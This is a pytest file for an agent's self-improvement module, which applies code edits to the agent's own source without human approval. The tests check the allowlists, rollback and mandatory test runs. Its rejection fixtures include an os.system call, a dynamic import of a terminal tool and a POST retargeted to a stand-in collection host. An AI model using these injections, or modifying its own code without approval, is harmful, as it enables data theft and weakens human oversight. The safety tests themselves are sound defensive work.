import json
from pathlib import Path

import pytest

import config
import self_improvement as si
from tools import registry


def test_self_improvement_registered_without_approval():
    tool = registry.TOOLS["self_improve"]
    assert tool["risk"] == "low"
    assert tool["confirm"] is False
    assert "self_improvement_rollback" in registry.TOOLS
    assert "self_improvement_status" in registry.TOOLS


def test_self_improvement_allowlist_rejects_control_plane():
    assert si._rel_path("planner.py") == "planner.py"
    with pytest.raises(ValueError):
        si._rel_path("agent.py")
    with pytest.raises(ValueError):
        si._rel_path("../outside.py")
    with pytest.raises(ValueError):
        si._rel_path("tests/test_tools.py")


def test_validates_exact_unique_patch_and_python_syntax():
    original = "import json\ndef _safe_json(raw):\n    return json.loads(raw)\n"
    sources = [("planner.py", original)]
    proposal = {
        "summary": "tiny improvement",
        "edits": [{
            "path": "planner.py",
            "old": "return json.loads(raw)",
            "new": "return {\"ok\": True}",
            "reason": "exercise patch path",
        }],
    }
    edits = si._validate_edits(proposal, sources, 1)
    contents = si._apply_edits_to_sources(sources, edits)
    assert 'return {"ok": True}' in contents["planner.py"]


def test_rejects_dangerous_new_calls():
    before = "def _safe_json(raw):\n    return raw\n"
    after = "import os\ndef _safe_json(raw):\n    os.system('echo bad')\n    return raw\n"
    with pytest.raises(ValueError):
        si._ensure_safe_code(before, after, "planner.py")


def test_auto_apply_runs_tests_and_can_rollback(tmp_path, monkeypatch):
    root = tmp_path / "kira"
    root.mkdir()
    (root / "planner.py").write_text("import json\ndef _safe_json(raw):\n    return json.loads(raw)\n", encoding="utf-8")
    tests = root / "tests"
    tests.mkdir()
    (tests / "test_value.py").write_text(
        "from planner import _safe_json\n\ndef test_value():\n    assert _safe_json('1') == 2\n",
        encoding="utf-8",
    )
    runtime = root / "runtime"
    monkeypatch.setattr(config, "BASE_DIR", root)
    monkeypatch.setattr(config, "RUNTIME_DIR", runtime)
    monkeypatch.setattr(si, "is_ollama_running", lambda: True)
    monkeypatch.setattr(
        si, "_select_sources",
        lambda goal, max_files: [("planner.py", (root / "planner.py").read_text(encoding="utf-8"))],
    )
    monkeypatch.setattr(si, "_propose", lambda goal, sources: {
        "summary": "autonomous self-improvement test",
        "edits": [{"path": "planner.py", "old": "return json.loads(raw)", "new": "return 2", "reason": "fix test"}],
    })

    result = si.self_improve("mejorar planner", max_files=1, run_tests=True, test_timeout=60)
    assert result["success"] is True
    assert result["applied"] is True
    assert result["approval_required"] is False
    assert "return 2" in (root / "planner.py").read_text(encoding="utf-8")
    assert result["validation"]["tests_ok"] is True

    rolled = si.rollback_self_improvement(result["backup_id"])
    assert rolled["success"] is True
    assert "return json.loads(raw)" in (root / "planner.py").read_text(encoding="utf-8")


def test_failed_staged_tests_never_apply_patch(tmp_path, monkeypatch):
    root = tmp_path / "kira"
    root.mkdir()
    original = "def _safe_json(raw):\n    return raw\n"
    (root / "planner.py").write_text(original, encoding="utf-8")
    tests = root / "tests"
    tests.mkdir()
    (tests / "test_value.py").write_text(
        "from planner import _safe_json\n\ndef test_value():\n    assert _safe_json('x') == 'expected'\n",
        encoding="utf-8",
    )
    monkeypatch.setattr(config, "BASE_DIR", root)
    monkeypatch.setattr(config, "RUNTIME_DIR", root / "runtime")
    monkeypatch.setattr(si, "is_ollama_running", lambda: True)
    monkeypatch.setattr(si, "_select_sources", lambda goal, max_files: [("planner.py", original)])
    monkeypatch.setattr(si, "_propose", lambda goal, sources: {
        "summary": "failing change",
        "edits": [{"path": "planner.py", "old": "return raw", "new": "return 'new'", "reason": "test fail"}],
    })

    result = si.self_improve("mejorar planner", max_files=1, run_tests=True, test_timeout=60)
    assert result["success"] is False
    assert result["applied"] is False
    assert (root / "planner.py").read_text(encoding="utf-8") == original


def test_self_improvement_cannot_skip_tests(monkeypatch):
    # A no-test run must be rejected before contacting Ollama or touching files.
    monkeypatch.setattr(si, "is_ollama_running", lambda: True)
    result = si.self_improve("mejora general", run_tests=False)
    assert result["success"] is False
    assert result["applied"] is False
    assert "sin ejecutar" in result["error"]


def test_rejects_new_dynamic_import_of_sensitive_tool():
    before = "def f():\n    return 1\n"
    after = "def f():\n    module = __import__('tools.terminal')\n    return module\n"
    with pytest.raises(ValueError):
        si._ensure_safe_code(before, after, "planner.py")


def test_explicit_self_improve_intent_is_detected():
    from agent import is_self_improvement_request
    assert is_self_improvement_request("KIRA, automejorate")
    assert is_self_improvement_request("mejorá tu propio código")
    assert is_self_improvement_request("analiza y mejora la robustez de tu memoria semántica")
    assert is_self_improvement_request("optimiza tu sistema")
    assert not is_self_improvement_request("mejora mi archivo arbol.py")


def test_run_dispatches_self_improvement_directly_without_approval(monkeypatch):
    import agent
    captured = {}
    monkeypatch.setitem(registry.TOOLS["self_improve"], "handler", lambda **kwargs: captured.update(kwargs) or {
        "success": True, "applied": True, "approval_required": False, "summary": "ok"
    })
    monkeypatch.setattr(agent, "_persist_memory", lambda memory, user_text, reply: None)
    result = agent.run("KIRA, automejorate", {"history": []})
    assert captured["goal"] == "KIRA, automejorate"
    assert result["tool_events"][0]["tool"] == "self_improve"
    assert result["tool_events"][0]["result"]["approval_required"] is False


def test_semantic_memory_allows_only_cosine_function_scope():
    from pathlib import Path
    semantic_source = (Path(__file__).resolve().parents[1] / "memory" / "semantic.py").read_text(encoding="utf-8")
    allowed = "return dot / (norm_a * norm_b) if norm_a and norm_b else -1.0"
    assert si._function_scope_for_edit("memory/semantic.py", semantic_source, allowed) == "_cos"
    with pytest.raises(ValueError):
        si._function_scope_for_edit("memory/semantic.py", semantic_source, "response = requests.post(")


def test_sensitive_network_target_change_is_rejected_even_if_call_count_is_same():
    before = '''import requests\ndef f():\n    return requests.post("http://localhost:11434/api/embed")\n'''
    after = '''import requests\ndef f():\n    return requests.post("https://example.invalid/collect")\n'''
    with pytest.raises(ValueError):
        si._ensure_safe_code(before, after, "memory/semantic.py")
